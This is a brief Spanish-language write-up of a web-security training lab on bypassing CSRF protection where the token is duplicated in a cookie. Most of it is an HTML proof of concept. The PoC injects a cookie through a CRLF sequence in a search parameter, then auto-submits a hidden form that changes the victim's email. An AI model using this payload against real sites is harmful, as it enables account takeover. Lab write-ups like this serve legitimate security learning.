---
title: "06 - CSRF where token is duplicated in cookie"
---

# 06 - CSRF where token is duplicated in cookie

Como se verifica si **csrfToken cookie = csrfToken body** ponemos en ambos : `a`

```html
<html>
  <!-- Añadimos la cookie csrfKey -->
	<script>fetch('https://0af4005503a7c54581448499004d0033.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=a%3b%20SameSite=None',{credentials:'include'})</script>
  <!-- Enviamos el csrf token que se corresponde con la key -->
  <body>
    <form action="https://0af4005503a7c54581448499004d0033.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test0000&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="a" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```
